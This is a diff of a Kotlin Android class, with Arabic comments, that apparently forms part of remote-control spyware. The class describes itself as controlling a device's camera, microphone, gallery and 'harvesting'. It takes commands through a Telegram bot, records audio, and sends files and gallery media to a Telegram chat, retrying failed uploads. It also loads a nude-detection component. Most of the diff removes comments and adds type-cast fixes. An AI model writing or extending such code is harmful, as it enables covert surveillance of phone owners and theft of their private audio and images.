@@ -16,7 +16,6 @@ import java.security.MessageDigest
 
 /**
  * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
- * هذه الفئة هي بديل commands.py مع حذف أوامر SMS وسجل الاتصالات.
  */
 class Commands private constructor(context: Context) {
 
@@ -86,9 +85,6 @@ class Commands private constructor(context: Context) {
             }
         }
 
-        /**
-         * نقطة دخول خارجية لتنفيذ الأوامر
-         */
         fun ex(
             context: Context,
             cmd: String,
@@ -102,15 +98,12 @@ class Commands private constructor(context: Context) {
     }
 
     init {
-        // تنظيف الملفات القديمة عند بدء التشغيل
         cleanupOldFiles()
-        // بدء خيط إعادة المحاولة في الخلفية
         startRetryLoop()
-        // تحميل المهام الفاشلة المحفوظة (سيتم معالجتها في حلقة إعادة المحاولة)
     }
 
     // ============================================================
-    //  دوال مساعدة: تحميل الإعدادات، إنشاء أسماء فريدة، حذف آمن
+    //  دوال مساعدة
     // ============================================================
 
     private fun loadConfig(): MutableMap<String, Any> {
@@ -208,7 +201,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  التسجيل الصوتي (بديل _record_audio)
+    //  التسجيل الصوتي
     // ============================================================
 
     private suspend fun recordAudio(durationSec: Int = 10): File? =
@@ -293,7 +286,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  إدارة المهام الفاشلة (قائمة انتظار)
+    //  إدارة المهام الفاشلة
     // ============================================================
 
     private fun addTaskToQueue(
@@ -357,7 +350,6 @@ class Commands private constructor(context: Context) {
                 val filename = task.optString("filename")
                 val content = task.optString("content")
 
-                // إذا تجاوز عدد المحاولات الحد الأقصى أو الملف غير موجود
                 if (attempts >= maxRetries) {
                     Log.w(TAG, "Task ${task.optString("id")} exceeded max retries, removing.")
                     safeRemove(File(filePath))
@@ -365,40 +357,34 @@ class Commands private constructor(context: Context) {
                     continue
                 }
 
-                // تأخير أسي
-                val waitTime = (1L shl attempts) * 60_000L // 2^attempts دقيقة
+                val waitTime = (1L shl attempts) * 60_000L
                 if (lastAttempt > 0 && System.currentTimeMillis() - lastAttempt < waitTime) {
                     remainingTasks.put(task)
                     continue
                 }
 
-                // محاولة إعادة الإرسال
                 Log.i(TAG, "Retrying task $type (attempt ${attempts + 1})")
 
                 val success = when (type) {
                     "audio" -> {
                         val file = File(filePath)
                         if (file.exists()) {
-                            // محاولة إرسال الصوت عبر tg (سيتم تنفيذها خارجياً)
-                            // نضيف المهمة إلى قائمة الانتظار للتنفيذ الفعلي
-                            false // سنقوم بتنفيذها عبر callback لاحقاً
+                            false
                         } else {
                             removed++
-                            true // حذف المهمة لأن الملف غير موجود
+                            true
                         }
                     }
                     "text_file" -> {
-                        false // سنقوم بتنفيذها عبر callback
+                        false
                     }
                     else -> false
                 }
 
                 if (success) {
-                    // تمت إعادة المحاولة بنجاح أو تم حذف الملف
                     safeRemove(File(filePath))
                     removed++
                 } else {
-                    // فشلت إعادة المحاولة، نزيد عدد المحاولات ونعيد إضافتها
                     task.put("attempts", attempts + 1)
                     task.put("last_attempt", System.currentTimeMillis())
                     remainingTasks.put(task)
@@ -415,7 +401,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  إرسال الملفات النصية (بديل _send_text_file)
+    //  إرسال الملفات النصية
     // ============================================================
 
     private suspend fun sendTextFile(tg: Any?, chatId: Long, content: String, filename: String) {
@@ -443,7 +429,6 @@ class Commands private constructor(context: Context) {
             }
         } catch (e: Exception) {
             Log.e(TAG, "Send text file error: ${e.message}")
-            // محاولة إرسال النص مباشرة
             sendTelegramMessage(tg, chatId, "📄 $filename:\n${content.take(4000)}")
             safeRemove(tempFile)
         }
@@ -458,12 +443,10 @@ class Commands private constructor(context: Context) {
             try {
                 if (cmd.isBlank()) return@launch
 
-                // الرد على callback إذا وُجد
                 cbq?.let { queryId ->
                     invokeTelegramMethod(tg, "answerCallbackQuery", mapOf("callback_query_id" to queryId))
                 }
 
-                // تحميل المكونات المطلوبة (محاكاة _ensure_components)
                 ensureComponents(m)
 
                 when {
@@ -500,20 +483,15 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  تحميل المكونات (بديل _ensure_components)
+    //  تحميل المكونات
     // ============================================================
 
     private suspend fun ensureComponents(m: Any?) {
         if (m == null) return
-        // هذه الدالة ستقوم بتحميل المكونات المطلوبة إذا لم تكن موجودة
-        // في الإصدار الحالي، نكتفي بالتحقق من وجودها
         try {
-            // التحقق من وجود nude_detector
             val nudeDetector = getModuleComponent(m, "nude_detector")
             if (nudeDetector == null) {
                 Log.w(TAG, "nude_detector not loaded, attempting to load...")
-                // هنا يمكن استدعاء مُنشئ الكلاسات المطلوبة
-                // سيتم تنفيذها لاحقاً عند تحويل المكونات الأخرى
             }
         } catch (e: Exception) {
             Log.e(TAG, "Component check error: ${e.message}")
@@ -749,7 +727,6 @@ class Commands private constructor(context: Context) {
                 val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
                 val jsonKb = kb?.toString() ?: ""
                 val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
-                // حفظ message_id لمشاكل التنقل
                 val msgId = response?.let { (it as? Map<*, *>)?.get("result")?.let { result ->
                     (result as? Map<*, *>)?.get("message_id")
                 } }
@@ -786,7 +763,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  دوال الانعكاس (Reflection) للتعامل مع المكونات الأخرى
+    //  دوال الانعكاس (Reflection)
     // ============================================================
 
     private fun getModuleComponent(target: Any?, fieldName: String): Any? {
@@ -836,23 +813,22 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  دوال الاتصال بـ Telegram API
+    //  دوال الاتصال بـ Telegram API (مع إصلاح Type Mismatch)
     // ============================================================
 
     /**
-     * استدعاء دالة Telegram API مع معالجة الأنواع بشكل صحيح.
-     * ✅ تم إصلاح مشكلة تطابق الأنواع (Type Mismatch).
+     * ✅ استدعاء دالة Telegram API مع تحويل صريح لحل مشكلة Type Mismatch
      */
     private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>): Any? {
         if (tg == null) return null
         return try {
             val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
             apiMethod?.isAccessible = true
-            
-            // ✅ تحويل صريح للأنواع لحل مشكلة Type Mismatch
+
+            // ✅ تحويل صريح للأنواع (Type Cast) لحل Java Type Mismatch
             @Suppress("UNCHECKED_CAST")
             val castedParams = params as MutableMap<Any?, Any?>
-            
+
             apiMethod?.invoke(tg, method, castedParams)
         } catch (e: Exception) {
             Log.e(TAG, "Telegram API call error: ${e.message}")
@@ -860,6 +836,9 @@ class Commands private constructor(context: Context) {
         }
     }
 
+    /**
+     * ✅ إرسال رسالة Telegram مع ضمان عدم وجود null
+     */
     private suspend fun sendTelegramMessage(
         tg: Any?,
         chatId: Any,
